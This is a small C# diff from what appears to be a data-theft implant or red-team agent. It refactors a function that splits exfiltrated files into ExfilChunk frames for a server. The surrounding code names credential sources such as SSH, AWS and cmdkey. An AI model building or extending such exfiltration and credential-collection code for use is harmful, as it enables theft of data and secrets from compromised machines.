@@ -122,41 +122,11 @@ internal static class Collect
             : (TaskOutcome.Succeeded, string.Join("\n", lines), Array.Empty<ExfilChunk>());
     }
 
-    // Slices a byte buffer into ExfilChunk frames of ChunkSize, stamping a
-    // terminal flag on the last chunk so the server reassembles and flushes
-    // the artifact. Sequence numbers start at 1.
+    // Slices a byte buffer into ExfilChunk frames of ChunkSize via the shared
+    // chunker (0-origin sequences, terminal on the last chunk); the server
+    // reassembles strictly by sequence and flushes on the terminal frame.
     internal static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
-    {
-        if (data.Length == 0)
-        {
-            return new[]
-            {
-                new ExfilChunk
-                {
-                    Name = name,
-                    ContentType = contentType,
-                    Sequence = 1,
-                    Terminal = true,
-                },
-            };
-        }
-        var chunks = new List<ExfilChunk>();
-        for (var offset = 0; offset < data.Length; offset += ChunkSize)
-        {
-            var end = Math.Min(offset + ChunkSize, data.Length);
-            var slice = new byte[end - offset];
-            Array.Copy(data, offset, slice, 0, slice.Length);
-            chunks.Add(new ExfilChunk
-            {
-                Name = name,
-                ContentType = contentType,
-                Sequence = (ulong)(chunks.Count + 1),
-                Terminal = end == data.Length,
-                Data = Google.Protobuf.ByteString.CopyFrom(slice),
-            });
-        }
-        return chunks;
-    }
+        => Chunking.ChunkFile(name, contentType, data, ChunkSize);
 
     private static bool IsKnownCredSource(string s)
         => s is "ssh" or "aws" or "cmdkey";
